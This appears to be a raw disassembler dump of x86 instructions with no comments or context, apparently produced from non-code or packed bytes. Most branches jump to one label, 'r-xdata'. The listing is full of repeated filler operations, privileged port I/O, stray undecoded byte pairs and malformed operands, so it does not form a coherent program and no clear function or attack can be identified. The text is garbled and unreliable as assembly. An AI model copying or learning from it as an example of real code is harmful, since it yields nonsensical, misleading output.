jecxz r-xdata
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
and [ esp + ebx ] ebp
jecxz r-xdata
sbb al 0x1c
jecxz r-xdata
jae r-xdata
jae r-xdata
or bh [ esi + 0x731c1c5f ]
xchg edi eax
pop dx
sub al 0x1c
sbb al 0xa
sbb al 0xa
xchg [ edi ] esi
sbb al 0x1c
in al dx
push 0xec156613
jecxz r-xdata
jae r-xdata
sbb [ ebx - 0x1c1c1d19 ] ecx
push 0xffffffa6
sbb al 0x93
push 0xe8e30a24
jae r-xdata
adc [ ebx + 0x140a9089 ] edi
sub ebx [ esp + ebx ]
sbb al 0x73
test [ edx - 0x5a ] ebp
jae r-xdata
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
inc ebx
or [ esp + ebx ] bl
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
xor eax 0x1c1d6a0a
sbb al 0x73
jae r-xdata
jae r-xdata
pushfd
aas
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
0x681c1c5e 0xf3a6
adc esp [ esi + 0x15 ]
in al dx
jae r-xdata
jae r-xdata
jae r-xdata
sbb eax edx
jae r-xdata
jae r-xdata
or ah bl
jae r-xdata
jae r-xdata
sub ah [ esi + 0x23 ]
in al dx
jae r-xdata
mov bl 0x68
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
sub al 0x1c
jae r-xdata
or [ esp + ebx ] ebx
int1
jae r-xdata
int3
jae r-xdata
or ecx ecx
jae r-xdata
sbb al 0x1c
leave
jae r-xdata
push ebp
in al 0xb3
bound esp [ ecx + ebp ]
jecxz r-xdata
in al dx
jae r-xdata
jae r-xdata
or esi ecx
jecxz r-xdata
and eax [ ebp + 0x6e1fa66a ]
mov bl 0x1c
xchg esi eax
outsb
call 0x73ba3808
jae r-xdata
out 0x68 eax
jae r-xdata
mov bl 0xa
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa5
mov dh 0xa
mov ah 0x39
outsb
pushad
sahf
out dx eax
jecxz r-xdata
iretd
outsb
mov dh 0x17
or ebp ecx
or [ esp + ebx ] ebx
or bl [ esi + eax ]
sbb al 0x1c
mov al 0xb5
sbb al 0x1c
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or cl ah
sbb al 0x1c
jae r-xdata
or cl ah
jecxz r-xdata
movsb [ edi ] [ esi ]
mov al [ 0xffffffffec2366f3 ]
sbb eax 0x68e3e3eb
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
or dl [ ebx + ebp ]
sbb al 0x1c
sbb ecx [ edx ]
jae r-xdata
test [ eax ] bh
sbb al 0xb3
jae r-xdata
jae r-xdata
aas
sbb al 0x96
jae r-xdata
mov esi 0x731c1c5f
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
mov [ bp + di - 0x1f ] 0xab0ae3e3
adc ebx [ esp + ebx ]
mov cl [ edx ]
je r-xdata
in al dx
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
lea eax [ ebp - 0x44f65996 ]
mov [ edi + 0xfa66a85 ] edx
mov ebx 0x760a8a89
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btr [ edx + ebp * 2 + 0x120b0fbe ] esi
adc [ esp + ebx ] ebx
pushad
daa
out dx eax
and bp sp
out 0x29 eax
sbb al 0x1c
push 0x6ab3b3a5
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
in eax dx
jmp 0x68fd37b9
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x68
mov dh 0xef
sbb ecx [ ebx - 0x1c1c1d19 ]
or bl [ edi + edi + 0x73731c1c ]
jae r-xdata
jae r-xdata
mov [ ebp + 0x9a66a85 ] ecx
mov ebx 0x6a859789
jae r-xdata
loop r-xdata
jae r-xdata
xchg ecx eax
pop ebx
and al 0xa6
in al dx
mov [ 0x1c24 ] al
jae r-xdata
sbb al 0x66
and ecx [ edx ]
0x731c1c02 0x8a89
sbb al 0x1c
jae r-xdata
sbb al 0xa
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
adc ecx [ edx ]
or [ esp + ebx ] ah
or [ bp + di ] esi
sbb al 0x1c
mov bl 0xa
add dh [ ebx ]
sbb al 0x1c
jae r-xdata
push 0x2366f3a0
in al dx
mov ebp 0x89202ab8
mov al [ ebp - 0x44f25996 ]
mov ebx eax
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
adc ebx [ esp + ebx ]
pushad
lahf
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
btc [ ecx + 0x3a760a8a ] ecx
cmpsb [ esi ] [ edi ]
jmp r-xdata
sbb al 0x97
jae r-xdata
and ebp esp
mov ebx esp
mov bl 0xa
fnstenv [ ebx ]
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
mov esp 0x2366b8bd
in al dx
xchg ebp eax
sub bl [ esp + ebx ]
xchg ecx eax
xchg ebp eax
retn
and bp sp
sbb al 0x73
jae r-xdata
pushad
sbb ebx [ esp + ebp * 8 ]
and al 0x1c
imul esp
jmp r-xdata
jae r-xdata
mov dh 0xe9
jae r-xdata
jae r-xdata
mul edx
jae r-xdata
jae r-xdata
jecxz r-xdata
adc edi [ ebx - 0x6ff53977 ]
jecxz r-xdata
sub ah [ eax ]
jae r-xdata
aas
sbb al 0x1c
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
mov dh 0xf3
outsb
nop [ esp + ebx ] bx
or edi ecx
or [ esp + ebx ] ebx
push 0xf10befb6
shl [ ebx ] 0x1
jae r-xdata
mov dh 0x68
jae r-xdata
jae r-xdata
xor bl [ esp + ebx ]
jae r-xdata
sbb al 0x1c
mov edx 0x6a858d89
scasb [ edi ]
or eax 0x1c0d2c0a
sbb al 0x68
cmp ecx [ ebx - 0x69ef9a79 ]
mov ah 0x6a
mov ebp 0xa8d0bab
sbb al 0x1c
std
punpcklbw mmx0 [ edi ]
sbb esp [ edx + 0xf ]
adc edi [ ebx - 0x33f56c77 ]
test [ edx - 0x5a ] ebp
jae r-xdata
or [ ebx + 0x6a859789 ] edi
cmpsb [ esi ] [ edi ]
or edi [ ecx ]
and bl [ esp + ebx ]
jecxz r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
popad
and [ ebx ] ah
shl [ ebx ] 0x1
mov esp 0x7373202a
push 0xe21c601a
in al dx
or ax 0x1c1c
ficomp [ esi - 0x21991309 ]
or [ esp + ebx ] ebx
or ch [ edi + 0x731c1c16 ]
jae r-xdata
jae r-xdata
or edi [ edi + 0x601c1c2f ]
daa
out dx eax
mov ebp ebx
loope r-xdata
jecxz r-xdata
jae r-xdata
test [ edx - 0x5a ] ebp
in al dx
jne r-xdata
jae r-xdata
jmp r-xdata
jae r-xdata
adc [ ebx + 0x740a8a89 ] edi
pop ss
push 0xffffffa6
jae r-xdata
mov [ edx + 0xda66a85 ] ecx
mov ebx 0x6a85c389
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
push ss
outsb
jae r-xdata
jae r-xdata
mov [ 0x1c01360a ] eax
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
pop ds
and eax 0xab41c1c
adc [ edx ] dh
sbb al 0x1c
in al dx
and [ edx ] cl
xchg esi eax
sbb al 0x1c
jae r-xdata
jae r-xdata
insd
push ds
sbb al 0x1c
or dl [ esi + 0x731c1c33 ]
jae r-xdata
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
or ah [ ecx + 0x731c1c0b ]
jecxz r-xdata
outsb
scasb [ edi ]
cmp ebp [ esi - 0x5a ]
dec ebx
or edi [ edx + 0xae3e3e1 ]
jo r-xdata
das
mov ebx [ edx - 0x59db796d ]
xor edx [ ecx + 0xbc3c395 ]
mov ecx fs
cmpsb [ esi ] [ edi ]
sub edx [ ebx + 0x24c38f91 ]
cmpsb [ esi ] [ edi ]
jae r-xdata
mov bh 0xb
sbb al 0x1c
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or bh [ edx + edx + 0x73731c1c ]
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jne r-xdata
outsb
jecxz r-xdata
mov esp 0x202ab8bd
cmpsb [ esi ] [ edi ]
push 0xffffff9e
or eax 0x6a853568
mov dh 0xd9
push 0x9e6a851b
adc ebp [ eax + 0x33 ]
test [ edx - 0x4a ] ebp
fild [ eax + 0x1a ]
push 0x9e6a8532
adc [ ebp + 0x68ddb66a ] eax
sbb ebp [ eax + 0x33 ]
test [ edx - 0x42 ] ebp
add [ edx ] ecx
pop es
pop ebp
sbb al 0x1c
test [ edx - 0x5a ] ebp
jae r-xdata
jae r-xdata
or ah [ edx ]
out dx al
jecxz r-xdata
cmp [ edx ] esp
sbb al 0x1c
loop r-xdata
jae r-xdata
jae r-xdata
add [ esp + ebx ] ebx
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffbe
pop ds
mov esi 0xe7b51c1f
jae r-xdata
sti
jecxz r-xdata
jne r-xdata
jae r-xdata
and eax 0x1c1e6d0b
sbb al 0xa
xchg esi eax
xor ebx [ esp + ebx ]
jae r-xdata
or cl [ edi + ebp + 0x1c ]
sbb al 0x73
mov ebx 0xcc0a9389
sbb al 0x1c
or dh [ esi + 0x3a ]
jecxz r-xdata
jae r-xdata
jae r-xdata
sbb al 0xb0
movsb [ edi ] [ esi ]
sbb al 0x75
dec edi
jecxz r-xdata
or bh [ ebp - 0x7ae3e3d3 ]
jae r-xdata
mov edx 0x67ec2366
jmp 0xffffffffd12a3b3e
jae r-xdata
in al dx
sbb eax 0x8561ecc3
loope r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
or dl ch
adc [ esp + ebx ] bl
adc bl [ esp + ebx ]
jae r-xdata
jae r-xdata
mov esi eax
or dl [ eax + 0x73e3e3e3 ]
sbb al 0x73
mov [ edx + 0x11a66a85 ] ecx
mov ebx 0x1c3f160a
jmp r-xdata
jbe r-xdata
sbb al 0xec
jae r-xdata
or eax 0x85c389bb
push 0xffffffa6
cmpsb [ esi ] [ edi ]
mov [ ecx - 0x59957a45 ] eax
sbb ecx [ ecx + 0x6a85bb90 ]
cmp bl [ esp + ebx ]
jae r-xdata
jae r-xdata
jae r-xdata
or al [ edi - 0x13e3e3c9 ]
outsb
mov ah 0xb0
or cl [ edx + edx + 0x73731c1c ]
sbb al 0xa
daa
out 0xe3 eax
sub al 0x1c
sbb al 0x1c
jae r-xdata
sbb al 0xb5
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
sbb al 0x96
outsb
cmpsb [ esi ] [ edi ]
aas
mov bl 0x68
and eax 0x1c58070b
sbb al 0xba
and bp sp
jae r-xdata
jae r-xdata
mov dl 0xa
aad 0x10
sbb al 0x1c
jecxz r-xdata
test [ edx - 0x5a ] ebp
jae r-xdata
sbb al 0x1c
sub eax 0x6a851c1c
mov esi 0xb88e891d
jae r-xdata
jmp 0xffffffffd12a3b3e
and ebp esp
jae r-xdata
jecxz r-xdata
sar [ ebx + 0x2b689b89 ] 0x85
jae r-xdata
jae r-xdata
jae r-xdata
push 0xffffffa6
jae r-xdata
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
or dl [ esi ]
jae r-xdata
sbb al 0x73
jae r-xdata
sbb al 0x73
jae r-xdata
and al 0x1c
sbb ax 0xe3eb
or ah [ ecx ]
mov [ edx + ebp * 2 ] ebx
sahf
sbb ebx [ esi * 2 - 0x1c1c1c91 ]
and cx [ edx ]
mov ecx 0x731c1c08
jae r-xdata
mov ebp edi
jecxz r-xdata
ja r-xdata
push 0x1b07600f
bound ecx [ edi ]
jae r-xdata
jae r-xdata
daa
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
cmpsb [ esi ] [ edi ]
iretd
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
push 0xffffffbe
sbb eax 0xab88e89
push es
sbb al 0x85
jae r-xdata
sub ah [ eax ]
sbb al 0x1c
mov esp 0x737320bd
jae r-xdata
insb
sub ebx [ esp + ebx ]
mov [ ebx + 0x6a852b68 ] ebx
scasb [ edi ]
jae r-xdata
sbb al 0x73
jae r-xdata
aas
mov ebx 0x1c0ba10a
cmpsb [ esi ] [ edi ]
jae r-xdata
test [ edx - 0x5a ] ebp
push 0xffffffa6
jae r-xdata
pushad
daa
out dx eax
fidivr [ edi + 0x67ecf7c7 ]
jmp r-xdata
jae r-xdata
jae r-xdata
popad
sbb al 0x1c
dec ebx
mov ch 0xa
pop esp
sub [ esp + ebx ] ebx
test [ edx - 0x52 ] ebp
jae r-xdata
sahf
sbb ebx [ esi * 4 + 0x603b68db ]
sbb [ esp + ebp * 8 ] bl
jecxz r-xdata
push 0xa66a8525
jae r-xdata
push 0xbc0aeba6
push 0xae6a852b
jae r-xdata
mov ebx 0x2b689b89
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
jecxz r-xdata
sbb al 0x1c
pushad
sbb eax 0xab681c1c
jmp r-xdata
fsubr st6
test [ edx - 0x5a ] ebp
test [ edx - 0x52 ] ebp
jae r-xdata
fwait
jae r-xdata
and eax 0xc1a66a85
jae r-xdata
pushad
jae r-xdata
or [ si ] bl
sbb al 0x1c
pushad
sahf
pop ds
out 0xec eax
outsd
add bl [ esp + ebx ]
sbb al 0xa
xlat
or al 0x1c
sbb al 0xa
jno r-xdata
cmp esp [ eax + 0x18 ]
sbb al 0xec
pushad
sbb dl cl
in al dx
sub al 0x1d
sbb al 0x1c
push 0x2468ebab
or esi [ edi + 0xa1c1c25 ]
mov ch 0x4
sbb al 0x1c
jae r-xdata
sbb al 0x73
jae r-xdata
loop r-xdata
sub eax [ ebp - 0x45385196 ]
mov [ ecx + 0x6a853a68 ] edx
mov esi 0x853b68c5
push 0xffffffbe
jae r-xdata
mov bl 0xec
jae r-xdata
jae r-xdata
push 0x9f681fae
outsb
or edx eax
adc eax 0x3c682d68
xor [ eax ] bl
pushad
and eax 0x110aa1eb
test [ edx - 0x5a ] ebp
pop es
mov ebx 0x6a858689
cmpsb [ esi ] [ edi ]
add eax 0xa8d89bb
in eax dx
add ebx [ esp + ebx ]
jae r-xdata
sbb al 0x73
jecxz r-xdata
push 0xffffffae
mov edx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
sbb al 0x1c
jae r-xdata
jae r-xdata
cmp ebp [ edx ]
jae r-xdata
and [ esp + ebx ] bl
jae r-xdata
mov eax 0x1c06670a
or ah [ edi + 0x6 ]
jmp r-xdata
arpl [ esi + edx * 4 ] bx
jae r-xdata
jae r-xdata
add ebx 0xc117a624
jae r-xdata
and [ ebx + 0x73 ] dh
mov esi eax
test [ edx - 0x5a ] ebp
btc [ edx ] ecx
sbb al 0x73
jae r-xdata
jae r-xdata
jae r-xdata
and al 0xa6
jae r-xdata
sub ah [ eax ]
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
mov ch 0x1c
jae r-xdata
pop ss
rol esi 0x8f
jae r-xdata
retn
jae r-xdata
iretd
mov [ ebp - 0x44f05996 ] 0xa
jae r-xdata
mov ah 0xaf
jae r-xdata
jae r-xdata

push 0xbe6a853a
lds ebp [ eax + 0x3b ]
test [ edx - 0x42 ] ebp
and bp sp
sbb al 0xb4
scasd [ edi ]
jae r-xdata
nop
and al 0xa6
jae r-xdata
0x1c13
in al dx
jae r-xdata
sbb eax ecx
retn
cmpsb [ esi ] [ edi ]
jae r-xdata
and [ ebp - 0x44025996 ] eax
mov ebp ecx
mov ebp 0x6a858689
rol ebx 0xc1
jae r-xdata
rol esi 0xa
movsd [ edi ] [ esi ]
sub [ esp + ebx ] bl
jae r-xdata
imul esi edx 0xec1368b5
push ebp
in eax 0xb4
in al dx
push ebp
sbb eax ecx
and al 0xa
add edi [ edx ]
xor eax [ ebp - 0x46c64996 ]
mov [ ebx + 0x3fb66a85 ] edx
jae r-xdata
jae r-xdata
jae r-xdata
mov edx 0xece11b60
jae r-xdata
mov ecx 0x6a858f89
mov dh 0x3d
mov ecx 0x6a858689
mov dh 0x3
or dl [ eax ]
push ss
sbb al 0x1c
jae r-xdata
push 0xffffffb6
mov bl 0x68
cmpsb [ esi ] [ edi ]
jmp r-xdata
push 0xffffffb6
aas
arpl [ esi ] bx
fsubr [ esi - 0x249e1311 ]
add [ esp + ebx ] ebx
mov ebp 0x1c29ec0a
sbb al 0x73
jae r-xdata
push esi
sbb al 0x1c
jae r-xdata
sbb al 0x1c
ja r-xdata
sbb esp ecx
jae r-xdata
sbb al 0x1c
or ebx [ edx - 0x5991e3e4 ]
or dl [ edx + 0xf ]
sbb al 0x1c
jae r-xdata
jae r-xdata
in al 0xe3
jecxz r-xdata
jecxz r-xdata
shl [ ebx ] 0x1
in al dx
jae r-xdata
jecxz r-xdata
jae r-xdata
nop [ ebx + esi * 2 ] ebx
jae r-xdata
sbb al 0x1c
jae r-xdata
mov bl 0x1c
xchg esi eax
pop es
sbb al 0xb4
mov edi 0xe21f9e60
in al dx
mov al 0x38
sbb al 0x1c
push 0xdf8bd7a5
jmp 0xffffffffa6b11577
fisub [ esi + 0x5bd50a1b ]
sbb al 0xd5
sbb al 0x74
pop ss
jecxz r-xdata
jecxz r-xdata
jae r-xdata
ja r-xdata
jae r-xdata
push edx
fsubr [ edx + ecx ]
outsb
mov [ esi ] ebp
sbb al 0x1c
jae r-xdata
test eax ebx
sub al 0xa
jae r-xdata
jae r-xdata
sbb al 0x73
jae r-xdata
mov bh 0xb
jae r-xdata
sbb al 0x73
jae r-xdata
sbb eax 0x279e6a85
jae r-xdata
ficomp [ edi + 0x67ecd3c7 ]
out 0xe3 al
jecxz r-xdata
jae r-xdata
jae r-xdata
mov [ 0x73202abc ] eax
jae r-xdata
jae r-xdata
xchg edi eax
jecxz r-xdata
cmpsb [ esi ] [ edi ]
jae r-xdata
adc [ edi ] ecx
sbb al 0x1c
jae r-xdata
rcr [ edx + ecx ] 0x1
push 0xffffffa5
mov ecx [ ebx ]
mov bl 0x3c
sbb al 0x1c
mov esi [ ebx ]
jno r-xdata
cdq
jae r-xdata
push [ ecx ]
pop edi
push 0xffffffb4
push 0xffffffa5
or [ ebx ] 0xffffff8f
cmp al 0x1c
sbb al 0x8b
lahf
mov dl 0x84
mov [ edx + ebp * 2 - 0x42f4785b ] esi
cmp al 0x1c
sbb al 0x8b
or ebx [ ecx - 0x74e3e3c4 ]
jae r-xdata
or eax eax
cmp al 0x1c
sbb al 0x8b
add ah cl
and al 0x52
or esi [ ebp + 0x3c ]
sbb al 0x1c
mov edi [ ecx - 0x4bf143f4 ]
push 0xffffffa5
or dl ah
stosb [ edi ]
mov ebp 0x8b1c1c3c
jae r-xdata
mov al 0xa
into
or esp esi
or [ esp + ebx ] ebx
push 0xffffff9f
in al dx
push esp
jae r-xdata
jae r-xdata
sub ah [ eax ]
jae r-xdata
loope r-xdata
jae r-xdata
or edx edi
cmp al 0x1c
sbb al 0x60
daa
mov [ 0xfffffffff853468b ] eax

mov ah 0x6a
movsd [ edi ] [ esi ]
loop r-xdata
cmp al 0x1c
sbb al 0x8b
mov edx esp
mov ebx esp
sbb al 0x97
sar [ esp + ebx ] 0x1c
mov eax [ edx ]
loope r-xdata
jecxz r-xdata
sbb al 0x1c
jae r-xdata
jmp 0xffffffffe3db145e
jae r-xdata
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
jecxz r-xdata
jecxz r-xdata
mov ah 0x6a
movsd [ edi ] [ esi ]
fwait
or esi esi
cmp al 0x1c
push edx
imul esp ebx 0xffffffe3
out 0x3c eax
and eax 0x6a851d68
sahf
push 0x9e6a851b
ja r-xdata
mov ecx [ eax ]
jae r-xdata
mov ecx 0x85e3e394
fsubr [ esp + ebp * 8 ]
jae r-xdata
jae r-xdata
jae r-xdata
and [ ebx + 0x73 ] dh
jae r-xdata
punpckldq mmx1 [ edi ]
mov bl 0xe1
jecxz r-xdata
fcom [ eax ]
in al dx
int 0x2
sbb al 0x1c
push 0x2ceb0a34
sbb al 0x1c
jae r-xdata
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
push 0x731c1c3c
or edx [ edi + 0x22 ]
sbb al 0x1c
dec esi
mov bl 0xa
jae r-xdata
jae r-xdata
xchg edi eax
sbb al 0x8b
fcmovnbe st4
fst [ edi ]
mov ah 0x6a
jcxz r-xdata
jecxz r-xdata
jae r-xdata
adc [ 0xffffffffdb8b1c1c ] bh
loop r-xdata
jecxz r-xdata
jae r-xdata
mov bl 0xb0
or cl dh
lahf
jae r-xdata
cmp [ ecx + 0x6a859389 ] edi
mov ah 0x89
nop
sbb al 0x6a
jae r-xdata
jae r-xdata
and eax 0x73731c1c
or dl [ esi + 0x731c1c2d ]
test [ edx - 0x4a ] ebp
cmp [ ecx + 0x1c5a9c0a ] 0x1c
jae r-xdata
sbb al 0x1c
jecxz r-xdata
push 0x65
jae r-xdata
or ch [ eax + 0x3c ]
sbb al 0x1c
jae r-xdata
sahf
sbb al 0x1c
pop esp
lodsd [ esi ]
test eax ebx
sub al 0xec
jae r-xdata
adc eax 0x66ec1c1c
sbb [ edx ] ah
jae r-xdata
lahf
jae r-xdata
sbb al 0x1c
or ah [ edi + 0xa1c1c20 ]
or bl [ eax + 0x1c ]
sbb al 0x73
jae r-xdata
sbb al 0x1c
in al dx
sbb [ edx ] ah
sbb al 0xb3
xchg eax edx
sub ah [ eax + 0x1b ]
sbb al 0xec
out 0xe2 eax
jecxz r-xdata
lahf
mov [ ebp + 0x6a851b68 ] esi
sahf
push 0xffffff9e
and [ eax + 0x1d ] ebp
test [ edx - 0x62 ] ebp
daa
mov ebp [ esi ]
das
xchg edi eax
and eax 0x6b656ab4
or eax [ ecx ]
cmp eax 0x48b1c1c
in al 0x63
push ss
sbb al 0x1c
push edi
and bl [ esp + ebx ]
jae r-xdata
psllq mmx1 [ ecx + 0x480abb82 ]
xor [ esp + ebx ] bl
pushad
fcomip st2
jecxz r-xdata
mov edx 0x22688289
test [ edx - 0x5a ] ebp
cmp edi [ ebx + 0x33688e89 ]
test [ edx - 0x4a ] ebp
jbe r-xdata
mov bl 0x87
shr [ edx ] 0x1
pushad
sbb ebx [ esp + ebp * 8 ]
pushad
jae r-xdata
mov dh 0x3f
mov dh 0x39
mov ecx 0x6a859389
or al dh
or bl [ esp + ebx ]
jae r-xdata
push 0x3bdf0a1d
outsb
push bx
push ds
sbb al 0x1c
or dl [ ecx + 0x731c1c1d ]
jae r-xdata
push ds
leave
jno r-xdata
sbb al 0x1c
jecxz r-xdata
btr [ edx ] ecx
jae r-xdata
push 0xb30f620f
loope r-xdata
mov bl 0xb
pop ebx
and eax 0xab51c1c
mov bl 0xb
imul edi [ esp + ebx ] 0x1c
mov ah 0x6a
jae r-xdata
mov ebx ebx
or esi [ edx ]
cmp eax 0xf88b1c1c
aaa
mov bl 0x81
mov ah 0x6a
inc edi
jecxz r-xdata
iretd
jae r-xdata
jecxz r-xdata
sub edx eax
sbb al 0xa
jae r-xdata
movsd [ edi ] [ esi ]
jae r-xdata
mov ah 0x6a
ja r-xdata
sbb al 0x8b
add al 0xe4
arpl [ esi ] dx
jecxz r-xdata
jae r-xdata
sbb al 0x90
jae r-xdata
pop es
mov bl 0x6e
cmpsb [ esi ] [ edi ]
imul esi [ ebx - 0x18764f50 ] 0xa
and [ eax ] esp
sbb al 0x1c
mov dh 0x68
punpcklbw mmx1 [ edi ]
[ edx + 0x30480abb ] eax
sbb al 0x1c
outsb
cmpsb [ esi ] [ edi ]
mov [ eax + 0x688289ba ] edx
and al [ ebp - 0x44c45996 ]
mov [ esi + 0x6a853368 ] ecx
mov ebp [ esi - 0x4b4e030f ]
or ebp [ ebx + 0x3c ]
sbb al 0x1c
jae r-xdata
lodsd [ esi ]
aaa
sbb al 0x1c
jae r-xdata
and edi [ 0xfffffffffd8b1c1c ]
shr [ eax + 0x1d ] cl
or bl bh
cmp ebx [ esp + ebx ]
jae r-xdata
push 0xffffffa5
cmp al 0x1c
sbb al 0x8b
scasb [ edi ]
int1
cld
mov cl 0xb4
jae r-xdata
mov esi 0x8538d0f3
push 0xffffffbe
push 0xe389eba6
mov edi esp
jecxz r-xdata
add al 0x25
sbb al 0x1c
jae r-xdata
sbb eax 0x1c3bdf0a
sbb al 0x73
mov ch 0xb3
or ebx [ ebx + 0x25 ]
jae r-xdata
sbb al 0x1c
mov ch 0xa
sbb al 0x1c
cmpsb [ esi ] [ edi ]
sbb ecx [ edx ]
aad 0x5b
sbb al 0x66
jae r-xdata
0x54ed
jecxz r-xdata
sbb al 0x1c
fistp [ ebx ]
mov ebx esp
mov esp ebx
jecxz r-xdata
jae r-xdata
and ebp esp
jae r-xdata
or bh [ eax + ebx + 0x73731c1c ]
test [ edx - 0x4a ] ebp
pop ecx
mov ecx 0x1c34790a
sbb al 0x73
jae r-xdata
xchg esi eax
out dx eax
sbb al 0x73
inc ebx
jecxz r-xdata
or al [ esi + 0x18 ]
sbb al 0x1c
jecxz r-xdata
sbb al 0x73
jae r-xdata
cmpsb [ esi ] [ edi ]
pop ss
inc esi
jae r-xdata
sti
jae r-xdata
jecxz r-xdata
sbb al 0x54
mov bl 0x89
sbb al 0x1c
loopne r-xdata
and [ ebx + 0x73 ] dh
jecxz r-xdata
mov ebp ebx
mov ebp [ edx - 0x40 ]
or bl dh
and eax 0x5fbe6a85
and [ esp + ebx ] ebx
jae r-xdata
push 0xffffffae
das
or ecx ecx
push esi
sbb al 0x1c
mov edx 0x66ec2366
cmc
pop esp
sbb al 0x1c
jae r-xdata
arpl [ eax + 0x3dfb0ab3 ] si
cmpsd [ esi ] [ edi ]
push 0xffffffa6
jae r-xdata
punpcklbw mmx1 [ edi ]
dec [ ecx - 0x6b764479 ]
fst [ 0x73731c1c ]
jae r-xdata
jecxz r-xdata
jecxz r-xdata
xchg esi eax
punpckhdq mm7 [ esi + 0x210d0a17 ]
sbb al 0x1c
jae r-xdata
jmp r-xdata
outsb
jecxz r-xdata
mov bl 0xb4
sbb al 0x75
xchg esi eax
out dx eax
or ecx [ edx + 0x3b ]
sbb al 0x1c
mov al [ 0x6ae789f7 ]
jae r-xdata
movsd [ edi ] [ esi ]
push 0xf6a0a39
sbb al 0x1c
push 0xffffffbe
inc esp
cmp eax 0x19601c1c
enter 0x7a0a 0x3d
sbb al 0x1c
jae r-xdata
jae r-xdata
lea ebp [ eax + 0x2b ]
test [ edx - 0x52 ] ebp
adc edi [ edx + 0x6a859789 ]
scasb [ edi ]
adc [ edx + 0x6a85cd89 ] edi
pop ds
cmpsb [ esi ] [ edi ]
jae r-xdata
jae r-xdata
mov dh 0x68
sub bl [ esp + ebx ]
jae r-xdata
sbb al 0x75
dec edi
jecxz r-xdata
test [ eax ] ah
sbb al 0x1c
pushad
daa
test [ ebx - 0x1c1c1de9 ] 0x1cebb41c
xchg edi eax
test [ edx - 0x4a ] ebp
and eax [ ebp - 0x7ad66196 ]
push 0xffffffbe
pop ss
or cl [ 0x731c1c21 ]
push 0xbe6a8525
pop edi
out dx eax
sbb al 0x74
dec ebx
jecxz r-xdata
jecxz r-xdata
daa
out dx eax
and bp sp
ja r-xdata
sbb al 0x60
jecxz r-xdata
daa
jecxz r-xdata
sbb al 0x1c
shl [ ebx ] 0x1
mov [ 0x1c506d0a ] eax
mov edi esp
jae r-xdata
jae r-xdata
mov [ edi - 0x2fe05996 ] esp
cmp [ esi - 0x5a ] ch
push esp
movsd [ edi ] [ esi ]
imul [ esi - 0x59 ]
sar ebx cl
jae r-xdata
or ah [ ebp + 0x1f ]
sbb al 0x1c
jae r-xdata
and ebp esp
sub [ bx + di ] ah
sbb al 0x1c
outsb
sar [ eax ] 0x1
jae r-xdata
jecxz r-xdata
jecxz r-xdata
jae r-xdata
mov ah 0xeb
sbb al 0x97
jae r-xdata
jecxz r-xdata
jae r-xdata
jecxz r-xdata
push 0xffffffa7
jae r-xdata
inc esi
jae r-xdata
fsub [ eax ]
in al dx
outsd
and eax 0x2b681c1c
or dh dl
pop esi
sbb al 0x1c
jae r-xdata
outsb
cmpsb [ esi ] [ edi ]
jae r-xdata
or ch [ ebp + 0x50 ]
sbb al 0x1c
sbb al 0xb5
loopne r-xdata
sbb al 0x73
jae r-xdata
mov [ 0x60e3e3e0 ] eax
sub bl [ esp + ebx ]
jae r-xdata
jecxz r-xdata
jae r-xdata
jae r-xdata
jae r-xdata
and ah ch
movaps xmm3 [ si ]
sbb al 0x68
sub ecx [ edx ]
inc esi
sbb [ esp + ebx ] bl
fisub [ edi + 0x61ecfbc7 ]
rcl [ eax ] 0x1
sbb al 0x1c
in al dx
push esp
sub bl [ cs : esp + ebx ]
jae r-xdata
jae r-xdata
shl [ ebx ] 0x1
sub ah [ eax ]
jae r-xdata
sbb al 0x1c
in al dx
pop ss
or ah [ edx ]
adc ebx [ esp + ebx ]
jae r-xdata
test [ edx - 0x52 ] ebp
jae r-xdata
jae r-xdata
add eax 0x73731c1c
jae r-xdata
pop ss
mov bl 0x89
jecxz r-xdata
sbb al 0x1c
sbb al 0x96
pop es
